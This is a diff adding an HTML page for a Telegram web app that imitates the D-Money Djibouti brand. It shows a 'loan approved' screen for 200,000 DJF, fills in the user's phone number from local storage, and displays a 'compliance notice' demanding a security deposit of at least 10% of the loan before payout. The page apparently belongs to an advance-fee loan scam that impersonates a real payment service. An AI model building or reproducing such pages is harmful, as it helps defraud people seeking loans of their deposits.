@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>D-Money Djibouti - Succès</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --dmoney-yellow: #ffcc00; --dmoney-dark: #111111; --bg-color: #f7f9fa; --card-bg: #ffffff; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--dmoney-dark); margin: 0; padding: 20px 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .screen-container { width: 100%; max-width: 400px; background-color: var(--card-bg); border-radius: 28px; padding: 30px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); display: flex; flex-direction: column; align-items: center; border-top: 6px solid var(--dmoney-yellow); }
+        .check-circle { width: 80px; height: 80px; background: var(--dmoney-yellow); color: var(--dmoney-dark); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 38px; font-weight: 900; margin-bottom: 20px; box-shadow: 0 6px 16px rgba(255, 204, 0, 0.4); }
+        .congrats-title { font-size: 24px; font-weight: 800; color: #111111; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px; }
+        .sub-text { color: #666666; font-size: 15px; text-align: center; line-height: 1.4; margin-bottom: 25px; }
+        .amount-box { width: 100%; background: var(--dmoney-dark); border-radius: 16px; padding: 22px 15px; text-align: center; color: white; margin-bottom: 25px; border: 2px solid var(--dmoney-yellow); }
+        .amount-label { font-size: 12px; font-weight: 800; text-transform: uppercase; color: var(--dmoney-yellow); margin-bottom: 8px; }
+        .amount-value { font-size: 32px; font-weight: 900; }
+        .info-card { width: 100%; background-color: #fffdf4; border: 1.5px solid #fef3c7; border-radius: 16px; padding: 20px 18px; margin-bottom: 25px; }
+        .info-header { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; color: #b45309; font-weight: 800; font-size: 14px; }
+        .info-body { font-size: 13.5px; line-height: 1.55; color: #4a4a4a; }
+        .details-heading { display: flex; align-items: center; gap: 10px; margin-bottom: 18px; font-size: 16px; font-weight: 800; color: #111111; width: 100%; }
+        .detail-item { display: flex; align-items: center; gap: 15px; margin-bottom: 16px; width: 100%; }
+        .icon-bg { width: 44px; height: 44px; background-color: #fffdf4; border: 1px solid #fef3c7; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .detail-label { font-size: 11px; color: #666; text-transform: uppercase; font-weight: 700; margin-bottom: 2px; }
+        .detail-val { font-size: 15px; font-weight: 800; color: #111; }
+        .home-btn { background-color: var(--dmoney-yellow); color: var(--dmoney-dark); border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3); }
+    </style>
+</head>
+<body>
+    <div class="screen-container">
+        <div class="check-circle">✓</div>
+        <div class="congrats-title"><span>🎉</span> Félicitations !</div>
+        <div class="sub-text">Votre prêt a été <b>approuvé !</b></div>
+
+        <div class="amount-box">
+            <div class="amount-label">MONTANT APPROUVÉ</div>
+            <div class="amount-value" id="display-amount">200 000 DJF</div>
+        </div>
+
+        <div class="info-card">
+            <div class="info-header">⚠️ AVIS DE CONFORMITÉ</div>
+            <div class="info-body">Votre compte D-Money doit maintenir un dépôt de sécurité d'au moins <b>10% du montant demandé</b> afin d'activer le décaissement instantané.</div>
+        </div>
+
+        <div class="details-heading"><span>💳</span> Détails du Prêt</div>
+        <div class="detail-item">
+            <div class="icon-bg">🇩🇯</div>
+            <div>
+                <div class="detail-label">NUMÉRO DE TÉLÉPHONE</div>
+                <div class="detail-val" id="display-phone">+253 ...</div>
+            </div>
+        </div>
+        <div class="detail-item">
+            <div class="icon-bg">💵</div>
+            <div>
+                <div class="detail-label">MENSUALITÉ</div>
+                <div class="detail-val" id="display-monthly">18 333 DJF</div>
+            </div>
+        </div>
+        <div class="detail-item">
+            <div class="icon-bg">📅</div>
+            <div>
+                <div class="detail-label">DURÉE DU PRÊT</div>
+                <div class="detail-val" id="display-term">12 Mois</div>
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/'">🏠 Retour à l'accueil</button>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
+
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+            const loanAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || "200000";
+            const loanTerm = localStorage.getItem('loan_term') || localStorage.getItem('duration') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || "18333";
+
+            document.getElementById('display-amount').innerText = Number(loanAmount).toLocaleString('fr-FR') + " DJF";
+            document.getElementById('display-phone').innerText = savedPhone ? `+253 ${savedPhone}` : "+253 ...";
+            document.getElementById('display-term').innerText = loanTerm + " Mois";
+            document.getElementById('display-monthly').innerText = Number(monthlyPay).toLocaleString('fr-FR') + " DJF";
+        });
+    </script>
+</body>
+</html>
